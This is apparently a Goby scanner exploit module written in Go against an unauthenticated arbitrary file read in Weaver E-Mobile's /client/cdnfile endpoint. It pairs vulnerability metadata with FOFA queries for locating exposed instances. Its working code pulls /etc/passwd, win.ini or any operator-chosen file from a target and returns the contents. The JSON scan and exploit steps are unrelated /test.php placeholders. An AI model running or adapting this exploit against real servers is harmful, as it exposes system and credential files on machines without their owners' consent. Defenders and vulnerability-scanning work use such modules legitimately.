package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver-EMobile /cdnfile File Read Vulnerability",
    "Description": "<p>E-Mobile is a mobile office product developed by E-Mobile Technology Co., Ltd., which is specially designed for mobile terminal users such as mobile phones and tablets, aiming to provide a convenient and efficient mobile office experience. </p><p>There is an arbitrary file reading vulnerability in the E-Mobile client/cdnfile interface, through which an unauthenticated attacker can read important files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.</p>",
    "Product": "Weaver-EMobile",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-08-10",
    "PostTime": "2024-10-09",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "(body=\"content=\\\"Weaver E-mobile\\\"\" || (body=\"E-Mobile&nbsp;\" && body=\"action=\\\"/verifyLogin.do\") || body=\"/images/login_logo@2x.png\" || (body=\"window.apiprifix = \\\"/emp\\\";\" && title=\"移动管理平台\"))",
    "GobyQuery": "(body=\"content=\\\"Weaver E-mobile\\\"\" || (body=\"E-Mobile&nbsp;\" && body=\"action=\\\"/verifyLogin.do\") || body=\"/images/login_logo@2x.png\" || (body=\"window.apiprifix = \\\"/emp\\\";\" && title=\"移动管理平台\"))",
    "Level": "1",
    "Impact": "<p>There is an arbitrary file reading vulnerability in the E-Mobile client/cdnfile interface, through which an unauthenticated attacker can read important files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_39894062/article/details/142463918"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,win.ini,Customize-linux,Customize-windows",
            "show": ""
        },
        {
            "name": "Customize1",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize-linux"
        },
        {
            "name": "Customize2",
            "type": "input",
            "value": "/1C/Windows/win.ini",
            "show": "mode=Customize-windows"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "泛微E-Mobile /cdnfile 文件读取漏洞",
            "Product": "泛微-EMobile",
            "Description": "<p>泛微E-Mobile是一款由泛微网络科技股份有限公司开发的移动办公产品，该产品专门为手机、平板电脑等移动终端用户设计，旨在提供便捷、高效的移动办公体验。<br></p><p>泛微E-Mobile client/cdnfile 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>泛微E-Mobile client/cdnfile 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Weaver-EMobile /cdnfile File Read Vulnerability",
            "Product": "Weaver-EMobile",
            "Description": "<p>E-Mobile is a mobile office product developed by E-Mobile Technology Co., Ltd., which is specially designed for mobile terminal users such as mobile phones and tablets, aiming to provide a convenient and efficient mobile office experience.&nbsp;</p><p>There is an arbitrary file reading vulnerability in the E-Mobile client/cdnfile interface, through which an unauthenticated attacker can read important files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an arbitrary file reading vulnerability in the E-Mobile client/cdnfile interface, through which an unauthenticated attacker can read important files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9959"
}`
	postOrGet_scxasoyhufgtiavgsyifgtcytasdfcbyjedsatfbweguifhwgifwesfwefgsd := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		requestConfig := httpclient.NewGetRequestConfig("/client/cdnfile" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 || strings.Contains(resp.RawBody, "\"errcode\":500") {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/client/cdnfile"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/1C/Windows/win.ini": "[fonts]",
				"/C/etc/passwd":       "root:",
			}
			// 函数继承
			uploadFileFunc := postOrGet_scxasoyhufgtiavgsyifgtcytasdfcbyjedsatfbweguifhwgifwesfwefgsd

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd":  {"/C/etc/passwd", "root:"},
				"win.ini": {"/1C/Windows/win.ini", "[fonts]"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_scxasoyhufgtiavgsyifgtcytasdfcbyjedsatfbweguifhwgifwesfwefgsd

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize-linux" {
				fileUrl = "/C" + goutils.B2S(ss.Params["Customize1"])
			} else if mode == "Customize-windows" {
				fileUrl = goutils.B2S(ss.Params["Customize2"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize-linux" && mode != "Customize-windows") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
